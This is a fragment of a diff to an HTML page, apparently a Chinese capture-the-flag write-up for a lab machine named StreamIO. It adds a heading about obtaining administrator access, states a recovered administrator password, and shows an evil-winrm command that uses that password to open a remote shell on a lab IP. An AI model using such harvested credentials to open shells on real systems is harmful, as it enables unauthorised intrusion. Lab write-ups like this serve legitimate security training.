@@ -1565,7 +1565,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 6</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 2</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># numReferences: 3</span>
-</span></span></code></pre></div><p>得到 <code>administrator</code> 的密码是 <code>6d0aX1[6d/x;30</code>。</p>
+</span></span></code></pre></div><h2 id="获得-administrator">获得 administrator</h2>
+<p>得到 <code>administrator</code> 的密码是 <code>6d0aX1[6d/x;30</code>。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.15.25 -u administrator -p <span style="color:#e6db74">&#39;6d0aX1[6d/x;30&#39;</span>
 </span></span><span style="display:flex;"><span>                                        
